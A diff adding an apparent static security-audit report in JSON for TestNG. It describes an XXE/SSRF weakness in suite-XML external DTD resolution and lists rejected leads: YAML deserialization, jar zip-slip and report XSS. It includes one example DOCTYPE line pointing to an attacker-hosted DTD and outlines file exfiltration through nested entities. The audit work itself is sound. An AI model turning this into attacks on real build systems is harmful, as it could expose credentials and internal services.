@@ -1,0 +1,61 @@
+{
+  "candidates": [
+    {
+      "attacker_control": "The contents of the suite definition TestNG parses: the DOCTYPE/systemId (e.g. <!DOCTYPE suite SYSTEM \"https://attacker.example/evil.dtd\"> and entity references in element content), a remote DTD/entity document served by the attacker, or a file: systemId pointing at a local file. Suite definitions can reach the parser from -suiteXmlFiles/CLI paths, <suite-files> entries, classpath/jar suite files (JarFileUtils), and .yaml suite paths through the same Parser entry point.",
+      "confidence": "medium",
+      "counterevidence_checked": "RuntimeBehavior.useSecuredUrlForDtd() does default to true and throws for 'http' systemIds (RuntimeBehavior.java:28-30, TestNGContentHandler.java:146-148), and TestNGURLs has a beust.com/testng.org allowlist - but that allowlist only redirects TestNG's own DTD lookups to the classpath, it does not restrict other hosts, and https/file are still resolved. The fetch behavior is partly intentional (TestNG loads its own DTD over https and supports local DTDs), and suite XML is normally authored by the same party that runs the tests, so exploitation needs an untrusted configuration input. Searches confirmed no FEATURE_SECURE_PROCESSING, disallow-doctype-decl, external-general-entities/external-parameter-entities=false, or ACCESS_EXTERNAL_DTD hardening anywhere in the snapshot.",
+      "id": "testng-suitexml-xxe-ssrf",
+      "impact": "An attacker who controls the suite definition can make the TestNG process read files readable by the JVM user and exfiltrate their contents through a crafted external DTD / nested parameter entity, fetch arbitrary https URLs (SSRF against internal services, including redirect following), and force parsing of attacker-controlled DTD content (entity expansion and entity-based resource exhaustion). In CI/build environments this can expose credentials and configuration files. No code execution was established from this path.",
+      "locations": [
+        {
+          "end_line": 150,
+          "path": "testng-core/src/main/java/org/testng/xml/TestNGContentHandler.java",
+          "start_line": 64
+        },
+        {
+          "end_line": 39,
+          "path": "testng-core/src/main/java/org/testng/xml/XMLParser.java",
+          "start_line": 16
+        },
+        {
+          "end_line": 42,
+          "path": "testng-core-api/src/main/java/org/testng/internal/RuntimeBehavior.java",
+          "start_line": 28
+        }
+      ],
+      "prerequisites": "TestNG parses a suite file whose content (or referenced DTD) is attacker-influenced; default configuration is sufficient (the blocking property -Dtestng.dtd.http=true only makes things weaker, not stronger); attacker needs an https host to serve the malicious DTD, or knowledge of a readable local file path; out-of-band exfiltration relies on the parser expanding nested parameter entities (standard for the JAXP default parser).",
+      "root_cause": "XMLParser builds a SAX parser from SAXParserFactory.newInstance() and only sets namespace-aware/validating flags; it never disables external general/parameter entities and never enables FEATURE_SECURE_PROCESSING or ACCESS_EXTERNAL_DTD/ELEMENT limits (no setFeature call exists anywhere in the tree). TestNGContentHandler.resolveEntity then hands any DOCTYPE/systemId coming from the parsed suite file to m_redirectionAwareResolver, which does new URL(systemId), url.openConnection() and returns the fetched bytes as the external DTD/entity InputSource. The only guard, RuntimeBehavior.useSecuredUrlForDtd() plus isUnsecuredUrl(), rejects solely the exact lowercase \"http\" scheme, so https: and pre-existing file: systemIds are resolved by default.",
+      "title": "Suite-XML external entity resolution allows XXE and SSRF (arbitrary https/file DTD fetch)",
+      "trace": "suite path -> org.testng.xml.internal.Parser.parse() (Parser.java:114-216; for non-file URIs only the URI string is carried, for file paths a FileInputStream is opened) -> SuiteXmlParser.parse() (SuiteXmlParser.java:11-22) -> XMLParser.parse() (XMLParser.java:35-39, synchronized m_saxParser.parse(is, dh)) -> SAX parser invokes TestNGContentHandler.resolveEntity() (lines 126-150) -> skipConsideringSystemId()/isUnsecuredUrl() (lines 152-183) -> m_redirectionAwareResolver (lines 64-93): new URL(systemId), getResourceAsStream, url.openConnection(), optional 3xx redirect handling, getInputStream() -> fetched bytes returned as InputSource and consumed as the external DTD/entity by the parser. The GITHUB-2501 entry in CHANGES.txt (line 6) documents that suite XML 'ENTITY SYSTEM' grammars do reach this resolver, corroborating the path.",
+      "unverified": "Static review only - no code was executed and no PoC was run. The JVM's default SAX provider decides whether/how the external subset and nested parameter entities are expanded (the code never sets these features); I did not confirm provider behavior at runtime. The practical severity also depends on how the deployment sources suite files, and the exfiltration step depends on entity/URI encoding constraints in the crafted DTD.",
+      "weakness_type": "CWE-611 (Improper Restriction of XML External Entity Reference) leading to CWE-918 (SSRF) and local file disclosure"
+    }
+  ],
+  "coverage_summary": "Source scope: 459 files (main sources plus build/CI config; the snapshot contains no test sources - testng/src, testng-core/src/test etc. are absent). P1 relation index: 451 files indexed, 386 Java files parsed, 8 source files missing from the index, 0 parse errors; index capabilities explicitly exclude control flow, data flow and semantic resolution, so call/containment edges are navigation hints only. Reviewed in source text: the whole suite parsing chain (xml/internal/Parser, XMLParser, SuiteXmlParser, TestNGContentHandler, XmlSuite/XmlClass loading, Yaml.java/YamlParser, JarFileUtils), report writers and helpers (XMLUtils, XMLStringBuffer, XMLReporter, XMLSuiteResultWriter, SuiteHTMLReporter, TestHTMLReporter, EmailableReporter/2, JUnit reporters, Files, FileStringBuffer), internal Utils, ClassHelper/InstanceCreator/object dispensers, RuntimeBehavior, TestNG entry points, TestNGAntTask high-risk sections, CI workflow scripts and build logic. Not exhaustively line-reviewed: very large execution-engine files (TestInvoker ~38KB, TestNG.java ~67KB, TestRunner ~44KB, Parameters ~35KB, ConfigInvoker ~24KB, MethodHelper, Group/Graph classes) and most annotation/reflection utility classes.",
+  "limitations": [
+    "No execution, tests, scanners or exploit payloads were run; all conclusions are static source reading and unconfirmed.",
+    "The relation index has no data-flow/control-flow/reachability proof and 8 source files are omitted from it; its security_call facts are name-based hints only and were not treated as verdicts.",
+    "SAX parser feature defaults (external entity expansion, external DTD loading) are provider-dependent and were not observed at runtime in this review; the report describes the code's failure to configure hardening rather than a runtime-confirmed exploit.",
+    "Large execution-engine classes and all test sources were outside the deep read; an issue there could have been missed.",
+    "Attacker-control/trust-model judgments (suite configuration vs test code) are deployment-dependent."
+  ],
+  "rejected_leads": [
+    {
+      "lead": "Unsafe SnakeYAML deserialization pattern in testng-core/src/main/java/org/testng/internal/Yaml.java (TestNGConstructor extends org.yaml.snakeyaml.constructor.Constructor, new Yaml(constructor) at line 55, y.load(is) at line 59) with snakeyaml 1.21 pinned in versions.properties:89 - the CVE-2022-1471 style arbitrary-tag object instantiation.",
+      "reason": "Real hardening gap, but YAML suite support is an optional feature (snakeyaml is an optional dependency; YamlParser is service-loaded and only accepts *.yaml), which weakens attacker control vs the always-present XML suite parser. Kept as secondary lead, not selected."
+    },
+    {
+      "lead": "Zip-slip in JarFileUtils.testngXmlExistsInJar (testng-core/src/main/java/org/testng/JarFileUtils.java:71-82): jar entry names are used verbatim in new File(file, jeName) when copying *.xml entries into a temp directory, so a ../ entry name escapes the directory.",
+      "reason": "The entry content is fully attacker-controlled, but extraction only occurs while TestNG is already running a supplied test jar whose classes TestNG then loads and executes, so the write primitive is largely subsumed by the jar's code-execution trust model; no explicit traversal filter exists, but it is a weaker distinct candidate."
+    },
+    {
+      "lead": "Unescaped test-derived strings (method/class names, parameters, Reporter output) written into HTML reports by TestHTMLReporter.generateTable and SuiteHTMLReporter (e.g. TestHTMLReporter.java:89-153, 197, SuiteHTMLReporter.java:158-183) could give stored XSS when reports are opened.",
+      "reason": "Only a lead: it depends on who can influence report data and who views the report, matches long-standing report behavior, and no attacker-controlled input to security-relevant output was traced end-to-end."
+    },
+    {
+      "lead": "Report/output path handling (SuiteHTMLReporter.getOutputDirectory uses xmlSuite.getName() in a path; Utils.writeFile/openWriter sanitize file names via replaceSpecialCharacters).",
+      "reason": "No concrete traversal was demonstrated in the writing paths examined: names that reach Utils.writeFile/openWriter are sanitized, and suite names only affect directory creation in the paths reviewed."
+    }
+  ],
+  "summary": "Snapshot is TestNG 7.5-SNAPSHOT (459 files; 386 Java sources, main/build/CI only, no tests). I reviewed the suite-definition parsing path (XMLParser, SuiteXmlParser, TestNGContentHandler, xml/internal/Parser, Yaml/YamlParser, JarFileUtils), report writers (XML/HTML/JUnit/emailable/FileStringBuffer), file utilities, class loading/instantiation, Ant task and CI/build files. The single strongest source-evidenced issue is in the suite-XML external-entity/DTD resolution path: the SAX parser is configured without disabling external entities, and TestNGContentHandler.resolveEntity forwards attacker-supplied DOCTYPE/systemId values to a resolver that opens the URL and returns its content as the external DTD/entity; only the exact lowercase \"http\" scheme is rejected by default, so \"https:\" and existing \"file:\" URLs are fetched. This supports XXE (local file read/exfiltration) and SSRF when a TestNG process parses a suite definition that an attacker can influence. Other plausible leads (unsafe SnakeYAML Constructor, jar-entry zip-slip, unescaped HTML report output) are listed as rejected/unconfirmed rather than additional candidates."
+}
